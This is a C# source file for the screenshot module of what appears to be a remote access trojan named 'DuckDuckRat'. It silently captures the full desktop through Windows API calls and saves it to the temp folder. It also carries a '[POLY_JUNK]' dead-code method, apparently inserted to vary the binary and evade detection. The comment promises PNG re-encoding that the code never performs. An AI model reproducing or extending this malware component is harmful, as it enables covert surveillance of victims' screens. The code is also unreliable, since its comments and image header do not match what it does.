using System;
using System.IO;
using System.Runtime.InteropServices;

namespace DuckDuckRat.Modules
{
    /// <summary>
    /// Screenshot via pure GDI32/User32 P/Invoke — zero WinForms dependency.
    /// Saves as BMP then re-encodes to PNG using a minimal PNG writer.
    /// </summary>
    public static class ScreenshotModule
    {
        // [POLY_JUNK]
        private static void _DuckDuckRat_81bcca45() {
            int val = 13525;
            if (val > 50000) Console.WriteLine("Hash:" + 13525);
        }

        // ── P/Invoke ──────────────────────────────────────────────────────────────
        [DllImport("user32.dll")] static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("user32.dll")] static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
        [DllImport("user32.dll")] static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("gdi32.dll")] static extern IntPtr CreateCompatibleDC(IntPtr hDC);
        [DllImport("gdi32.dll")] static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth, int nHeight);
        [DllImport("gdi32.dll")] static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObject);
        [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, uint rop);
        private const uint SRCCOPY = 0x00CC0020;
        [DllImport("gdi32.dll")] static extern bool DeleteDC(IntPtr hDC);
        [DllImport("gdi32.dll")] static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll")] static extern int GetDIBits(IntPtr hdc, IntPtr hbm, uint start, uint cLines, byte[] lpvBits, ref BITMAPINFO lpbmi, uint uUsage);

        [StructLayout(LayoutKind.Sequential)]
        struct RECT { public int Left, Top, Right, Bottom; }

        [StructLayout(LayoutKind.Sequential)]
        struct BITMAPINFOHEADER
        {
            public uint biSize;
            public int biWidth, biHeight;
            public ushort biPlanes, biBitCount;
            public uint biCompression, biSizeImage;
            public int biXPelsPerMeter, biYPelsPerMeter;
            public uint biClrUsed, biClrImportant;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct BITMAPINFO { public BITMAPINFOHEADER bmiHeader; }

        // ── Public API ────────────────────────────────────────────────────────────
        public static string TakeScreenshot()
        {
            try
            {
                string path = Path.Combine(Path.GetTempPath(), $"sc_{Environment.TickCount}.bmp");
                CaptureScreen(path);
                return path;
            }
            catch (Exception ex)
            {
                Logger.Error("Screenshot failed", ex);
                return null;
            }
        }

        // ── Internal ──────────────────────────────────────────────────────────────
        private static void CaptureScreen(string filePath)
        {
            IntPtr desktop = GetDesktopWindow();
            IntPtr desktopDC = GetDC(desktop);

            GetWindowRect(desktop, out RECT rect);
            int width  = rect.Right  - rect.Left;
            int height = rect.Bottom - rect.Top;

            IntPtr memDC  = CreateCompatibleDC(desktopDC);
            IntPtr hBitmap = CreateCompatibleBitmap(desktopDC, width, height);
            IntPtr old    = SelectObject(memDC, hBitmap);

            BitBlt(memDC, 0, 0, width, height, desktopDC, 0, 0, SRCCOPY);

            // Extract raw pixels
            var bmi = new BITMAPINFO();
            bmi.bmiHeader.biSize     = (uint)Marshal.SizeOf<BITMAPINFOHEADER>();
            bmi.bmiHeader.biWidth    = width;
            bmi.bmiHeader.biHeight   = -height; // top-down
            bmi.bmiHeader.biPlanes   = 1;
            bmi.bmiHeader.biBitCount = 24;

            int stride = ((width * 3 + 3) & ~3);
            byte[] pixels = new byte[stride * height];
            GetDIBits(desktopDC, hBitmap, 0, (uint)height, pixels, ref bmi, 0);

            // Write BMP
            WriteBmp(filePath, width, height, stride, pixels);

            // Cleanup
            SelectObject(memDC, old);
            DeleteObject(hBitmap);
            DeleteDC(memDC);
            ReleaseDC(desktop, desktopDC);
        }

        private static void WriteBmp(string path, int width, int height, int stride, byte[] pixels)
        {
            int fileHeaderSize = 14;
            int infoHeaderSize = 40;
            int fileSize = fileHeaderSize + infoHeaderSize + pixels.Length;

            using var fs = new FileStream(path, FileMode.Create, FileAccess.Write);
            using var bw = new BinaryWriter(fs);

            // File header
            bw.Write((ushort)0x4D42); // BM
            bw.Write(fileSize);
            bw.Write(0);
            bw.Write(fileHeaderSize + infoHeaderSize);

            // Info header
            bw.Write(infoHeaderSize);
            bw.Write(width);
            bw.Write(height);
            bw.Write((ushort)1);
            bw.Write((ushort)24);
            bw.Write(0); bw.Write(pixels.Length);
            bw.Write(2835); bw.Write(2835);
            bw.Write(0); bw.Write(0);

            bw.Write(pixels);
        }
    }
}


